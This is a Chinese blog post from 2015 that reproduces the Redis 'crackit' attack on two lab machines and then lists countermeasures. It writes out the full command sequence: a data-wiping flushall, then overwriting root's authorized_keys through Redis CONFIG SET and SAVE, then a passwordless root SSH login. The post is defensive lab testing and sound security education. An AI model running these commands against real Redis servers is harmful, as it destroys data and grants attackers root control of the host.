---
title: Redis-Crackit漏洞测试
tags:
  - redis-crackit
  - redis漏洞
id: 686
categories:
  - Redis
date: 2015-11-12 13:57:58
---

目前redis crackit漏洞爆出可以通过系统sh登录。免密码的，所以这个是很严重的。

下面我自己测试了下，并有几条防范措施。
<div>环境：</div>
<div>客户端：10.19.21.241</div>
<div>服务端：10.19.21.242（此服务器运行redis服务的用户是root，如果不是root不能测试。）</div>
<div></div>
<!-- more -->
### 1\. 首先客户端生成ssh key

<div>
<pre class="lang:sh decode:true ">[root@VM-241 ~]# ssh-keygen -t rsa -C "crackit@redis.io"
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa):
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in /root/.ssh/id_rsa.
Your public key has been saved in /root/.ssh/id_rsa.pub.
The key fingerprint is:
bb:16:6e:39:57:d4:b7:c0:dc:ed:05:80:a5:4e:7d:ae crackit@redis.io
The key's randomart image is:
+--[ RSA 2048]----+
|           oo.   |
|          .o  .  |
|          o +.o..|
|         o  .*..+|
|        S ..  ooo|
|        ..  .. ..|
|       ..o .E    |
|        *..      |
|       o.o       |
+-----------------+</pre>

### 2\. 给公钥添加换行

<pre class="lang:sh decode:true ">[root@VM-241 ~]# (echo -e "\n\n"; cat /root/.ssh/id_rsa.pub; echo -e "\n\n") &gt; redis.txt</pre>

### 3\. 清空服务器redis数据（慎重操作）

<pre class="lang:sh decode:true ">[root@VM-241 ~]# redis-cli -h 10.19.21.242 flushall
OK</pre>

### 4\. 将公钥写入到redis的key中

<pre class="lang:sh decode:true ">[root@VM-241 ~]# cat redis.txt |redis-cli -h 10.19.21.242 -x set redis
OK</pre>

### 5\. 连接redis服务器

<pre class="lang:sh decode:true ">[root@VM-241 ~]# redis-cli -h 10.19.21.242 
redis 10.19.21.242:6379&gt; config set dir /root/.ssh #设置rdb存放路径
OK
redis 10.19.21.242:6379&gt; config set dbfilename "authorized_keys" #设置rdb文件的文件名
OK
redis 10.19.21.242:6379&gt; save
OK
redis 10.19.21.242:6379&gt; exit</pre>

### 6\. 尝试登录

<pre class="lang:sh decode:true ">[root@VM-241 ~]# ssh root@10.19.21.242
The authenticity of host '10.19.21.242 (10.19.21.242)' can't be established.
RSA key fingerprint is 12:79:d4:36:00:1d:de:48:13:bc:eb:e7:ca:83:84:c3.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.19.21.242' (RSA) to the list of known hosts.
Last login: Wed Apr 15 19:16:22 2015 from 10.19.10.25
[root@VM-242 ~]# 

查看公钥内容
[root@VM-242 ~]# cat /root/.ssh/authorized_keys
REDIS0002?redisA?

ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAwUkf3THelm1tARScEkGDZkHiixtBUiS7nW6ShdIcK0apiL+/7CYh/SrCX1k9X0+wFhhNbdQBdz+AIPpQA2UlhAogsj6YRR1vXYORumw2tRmAkxBifvsV/ZZs54u50O6NmMesZRfkzMqskoZCwNVKbzPWuXKmcrIyBnQzRp9NL7YjQXQnAqkD7btGjpdZZudqr/IUnkcS1i8dAbRnF0jQybrT8NnbiqOWVnuIhlXVgnASdI+Qq/p0w83HuuivXZLMMuIwfU9Tj30hV+haqatib1L0G+QyUBpgVmxuUZJrGlMsM+Nj15K8TIPeK4cQ419SbbJXrkqWX2fPok7+9iiD6w== crackit@redis.io

?[root@VM-242 ~]# exit</pre>
这样表示这台服务器被外部控制

### 7\. 如何防护

##### 7.1 在服务器端禁用flushall命令。

<pre class="lang:sh decode:true">[root@VM-242 ~]# echo 'rename-command flushall ""' &gt;&gt; /etc/redis.conf
[root@VM-242 ~]# /etc/init.d/redis restart</pre>

##### 客户端测试

<pre class="lang:sh decode:true ">[root@VM-241 ~]# redis-cli -h 10.19.21.242 flushall
(error) ERR unknown command 'flushall'</pre>

##### 7.2 服务器端设置redis的监听地址为127.0.0.1

<div>
<pre class="lang:sh decode:true ">[root@VM-242 ~]# vim /etc/redis.conf
bind 127.0.0.1</pre>

##### 7.3 建议不要用root用户运行。我是yum安装，默认启动用户是redis，为了测试，在服务里更改成root。大家测试也可以这么修改。

<pre class="lang:sh decode:true ">[root@VM-242 ~]# vim /etc/init.d/redis
start() {
    [ -f $REDIS_CONFIG ] || exit 6
    [ -x $exec ] || exit 5
    echo -n $"Starting $name: "
    #daemon --user ${REDIS_USER-redis} "$exec $REDIS_CONFIG"
    daemon --user root  "$exec $REDIS_CONFIG"
    retval=$?
    echo
    [ $retval -eq 0 ] &amp;&amp; touch $lockfile
    return $retval
}</pre>

##### 7.4 设置redis服务器密码

<div>
<pre class="lang:sh decode:true ">[root@VM-242 ~]# echo "requirepass  xxoo" &gt;&gt; /etc/redis.conf</pre>
&nbsp;

</div>
</div>
</div>
